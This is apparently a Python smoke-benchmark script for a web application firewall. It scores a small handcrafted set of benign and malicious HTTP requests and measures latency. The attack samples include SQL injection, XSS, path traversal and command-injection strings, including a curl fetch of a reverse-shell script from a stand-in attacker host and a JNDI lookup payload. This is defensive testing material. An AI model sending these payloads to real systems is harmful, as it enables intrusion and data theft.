#!/usr/bin/env python3
"""Run a small local regression smoke check and a separate timing loop.

This handcrafted corpus is not a publication dataset. Accuracy is measured once
per unique canonical request; repeated runs are used only for latency.
Use evaluate_dataset.py for deduplicated, group-held-out evaluation.
"""

import hashlib
import json
import os
import platform
import statistics
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from waf.normalization.canonicalizer import Canonicalizer
from waf.rules.deterministic_engine import DeterministicRuleEngine
from waf.inference.model_engine import create_default_scorer
from waf.pipeline import WafPipeline
from waf.risk.policy_engine import PolicyEngine

# (category, raw HTTP request, is_attack)
BENCHMARK_PAYLOADS = [
    ("SQLI", "GET /users?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1", True),
    ("SQLI", "POST /login HTTP/1.1\nHost: app.local\n\nuser=admin' OR '1'='1&pass=foo", True),
    ("SQLI", "GET /search?q=1;%20DROP%20TABLE%20accounts;-- HTTP/1.1", True),
    ("SQLI", "GET /items?cat=1%20AND%20SLEEP(5)-- HTTP/1.1", True),
    ("SQLI", "GET /data?val=1'%20AND%20extractvalue(1,concat(0x7e,(select%20user())))-- HTTP/1.1", True),
    ("XSS", "POST /comments HTTP/1.1\nHost: app.local\n\ntext=<script>alert('xss')</script>", True),
    ("XSS", "GET /search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1", True),
    ("XSS", "GET /profile?bio=%3Csvg/onload=confirm(1)%3E HTTP/1.1", True),
    ("XSS", "GET /view?page=javascript:/*--%3E%3Csvg/onload='/*%60/*/%2balert(1)//'%3E HTTP/1.1", True),
    ("XSS", "POST /feedback HTTP/1.1\nHost: app.local\n\nmsg=<iframe src=\"javascript:alert(1)\">", True),
    ("RCE", "POST /ping HTTP/1.1\nHost: app.local\n\nip=127.0.0.1;cat /etc/passwd", True),
    ("RCE", "GET /status?host=localhost%7C%7Ccurl%20http://attacker.com/revshell.sh HTTP/1.1", True),
    ("RCE", "POST /exec HTTP/1.1\nHost: app.local\n\ncmd=%26%26powershell.exe%20-EncodedCommand%20AAA", True),
    ("RCE", "GET /log?msg=${jndi:ldap://evil.corp/a} HTTP/1.1", True),
    ("RCE", "GET /backup?path=test%60id%60 HTTP/1.1", True),
    ("TRAVERSAL", "GET /static/../../../../etc/shadow HTTP/1.1", True),
    ("TRAVERSAL", "GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1", True),
    ("TRAVERSAL", "GET /view?doc=....//....//....//windows/system.ini HTTP/1.1", True),
    ("TRAVERSAL", "GET /load?path=%252e%252e%252f%252e%252e%252fboot.ini HTTP/1.1", True),
    ("BENIGN", "GET / HTTP/1.1\nHost: myapp.org\nUser-Agent: Mozilla/5.0", False),
    ("BENIGN", "GET /api/v1/products?category=electronics&sort=asc&page=2 HTTP/1.1", False),
    ("BENIGN", "POST /api/v1/login HTTP/1.1\nHost: myapp.org\nContent-Type: application/json\n\n{\"username\":\"alice\",\"password\":\"S3cureP@ssword!\"}", False),
    ("BENIGN", "GET /static/css/theme-dark.min.css HTTP/1.1\nAccept: text/css", False),
    ("BENIGN", "POST /api/v1/orders HTTP/1.1\nHost: myapp.org\n\n{\"item_id\":102,\"quantity\":3,\"shipping_address\":\"123 Main St, Springfield\"}", False),
    ("BENIGN", "GET /search?q=cybersecurity+defense+frameworks HTTP/1.1", False),
    ("BENIGN", "GET /health HTTP/1.1\nHost: internal-service.local", False),
    ("BENIGN", "GET /favicon.ico HTTP/1.1\nUser-Agent: Chrome/120.0", False),
    ("BENIGN", "PUT /api/v1/profile HTTP/1.1\nHost: myapp.org\n\n{\"display_name\":\"Sarah Connor\",\"theme\":\"dark\"}", False),
    ("BENIGN", "GET /api/v1/notifications?unread=true&limit=10 HTTP/1.1", False),
]


def confusion(labels: list[int], predictions: list[int]) -> dict[str, int]:
    return {
        "tp": sum(y == 1 and p == 1 for y, p in zip(labels, predictions)),
        "tn": sum(y == 0 and p == 0 for y, p in zip(labels, predictions)),
        "fp": sum(y == 0 and p == 1 for y, p in zip(labels, predictions)),
        "fn": sum(y == 1 and p == 0 for y, p in zip(labels, predictions)),
    }


def metrics(counts: dict[str, int], total: int) -> dict[str, Any]:
    tp, tn, fp, fn = counts["tp"], counts["tn"], counts["fp"], counts["fn"]
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    return {
        "n": total,
        **counts,
        "accuracy": round((tp + tn) / total, 6) if total else None,
        "precision": round(precision, 6),
        "recall": round(recall, 6),
        "f1_score": round(2 * precision * recall / (precision + recall), 6) if precision + recall else 0.0,
        "fpr": round(fp / (fp + tn), 6) if fp + tn else None,
        "fnr": round(fn / (fn + tp), 6) if fn + tp else None,
    }


def percentile(values: list[float], fraction: float) -> float:
    ordered = sorted(values)
    return ordered[min(len(ordered) - 1, max(0, int((len(ordered) - 1) * fraction)))]


def run_benchmark(iterations: int = 50) -> dict[str, Any]:
    canonicalizer = Canonicalizer()
    unique: dict[str, tuple[str, str, bool]] = {}
    for category, raw, is_attack in BENCHMARK_PAYLOADS:
        canonical = canonicalizer.parse_raw_http_request(raw)["canonical_text"]
        digest = hashlib.sha256(canonical.encode("utf-8")).hexdigest()
        unique.setdefault(digest, (category, raw, is_attack))
    examples = list(unique.values())
    labels = [int(row[2]) for row in examples]
    scorer = create_default_scorer()
    rules = DeterministicRuleEngine()
    policy = PolicyEngine(mode="ENFORCING")
    hybrid_pipeline = WafPipeline(mode="ENFORCING", model_inference_fn=scorer.predict)
    timing_pipeline = WafPipeline(mode="ENFORCING", model_inference_fn=scorer.predict)

    predictions: dict[str, list[int]] = {"rules_only": [], "heuristic_only": [], "hybrid_rules_heuristic": []}
    category_counts: dict[str, dict[str, int]] = {}
    for category, raw, is_attack in examples:
        parsed = canonicalizer.parse_raw_http_request(raw)
        det_score, matches = rules.inspect(parsed)
        heuristic_score = scorer.predict(parsed["canonical_text"])
        rules_result = policy.evaluate(det_score, 0.0, 0.0, matches, parsed["anomaly_flags"])
        heuristic_result = int(heuristic_score >= 0.70)
        hybrid_result = int(hybrid_pipeline.inspect_request(raw)["decision"] == "BLOCK")
        values = {
            "rules_only": int(rules_result.action == "BLOCK"),
            "heuristic_only": heuristic_result,
            "hybrid_rules_heuristic": hybrid_result,
        }
        for name, prediction in values.items():
            predictions[name].append(prediction)
        counts = category_counts.setdefault(category, {"total": 0, "blocked": 0, "allowed": 0})
        counts["total"] += 1
        if hybrid_result:
            counts["blocked"] += 1
        else:
            counts["allowed"] += 1

    # Warmup is excluded. Repetitions below measure timing only; they never inflate
    # the sample count used in confusion matrices or accuracy.
    for _ in range(min(iterations, 10)):
        for _, raw, _ in examples:
            timing_pipeline.inspect_request(raw)
    latencies_ms: list[float] = []
    started = time.perf_counter()
    for _ in range(iterations):
        for _, raw, _ in examples:
            tick = time.perf_counter()
            timing_pipeline.inspect_request(raw)
            latencies_ms.append((time.perf_counter() - tick) * 1000.0)
    elapsed = time.perf_counter() - started

    labels_by_lane = {name: metrics(confusion(labels, lane_predictions), len(examples)) for name, lane_predictions in predictions.items()}
    report = {
        "report_type": "local_smoke_benchmark",
        "created_at_utc": datetime.now(timezone.utc).isoformat(),
        "evidence_scope": "Regression check on handcrafted examples only; not a publication or production performance claim.",
        "unique_samples": len(examples),
        "timing_iterations_per_sample": iterations,
        "timed_inspections": len(latencies_ms),
        "throughput_rps": round(len(latencies_ms) / max(elapsed, 1e-9), 2),
        "dataset_sha256": hashlib.sha256("\n".join(sorted(unique)).encode()).hexdigest(),
        "metrics_by_lane": labels_by_lane,
        "breakdown": category_counts,
        "latency_ms": {
            "mean": round(statistics.mean(latencies_ms), 4),
            "p50": round(percentile(latencies_ms, 0.50), 4),
            "p95": round(percentile(latencies_ms, 0.95), 4),
            "p99": round(percentile(latencies_ms, 0.99), 4),
        },
        "environment": {
            "python": sys.version.split()[0], "platform": platform.platform(),
            "processor": platform.processor() or None, "cpu_count": os.cpu_count(),
        },
        "limitations": [
            "Only 29 handcrafted requests are present in this corpus.",
            "Accuracy metrics count each unique canonical request once; timing repetitions are not counted as new samples.",
            "The heuristic is not a trained Transformer and latency excludes HTTP/network/upstream time.",
            "No confidence intervals are reported for this small demo corpus; use evaluate_dataset.py for grouped evaluation.",
        ],
    }
    report_path = ROOT / "benchmark_results.json"
    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    print(json.dumps(report, indent=2))
    print(f"\nSmoke report saved to {report_path}")
    return report


if __name__ == "__main__":
    run_benchmark()
